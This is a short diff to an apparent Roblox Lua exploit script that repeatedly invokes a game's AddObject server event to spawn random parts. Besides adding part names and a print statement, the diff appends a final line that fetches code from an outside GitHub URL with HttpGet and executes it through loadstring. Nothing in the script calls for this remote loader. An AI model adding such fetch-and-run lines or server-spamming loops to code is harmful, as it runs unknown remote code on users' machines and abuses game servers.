@@ -7,12 +7,15 @@ local PL = {
 	"Spin Lava",
 	"Ramp",
 	"Torus",
-	"Truss"
+	"Truss",
+	"Button",
+	"Fading Part"
 }
 
 local function addpart()
 	local Selected = math.random(1, #PL)
 	Selected = PL[Selected]
+	print(Selected)
 	game:GetService("ReplicatedStorage").Events.AddObject:InvokeServer(Selected, workspace.Obbies[plrr].Area.CFrame)
 end
 
@@ -65,3 +68,4 @@ while wait() do --game:GetService("ReplicatedStorage").Events.AddObject:InvokeSe
 	end
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kw-roblox/OCkey/main/test"))()
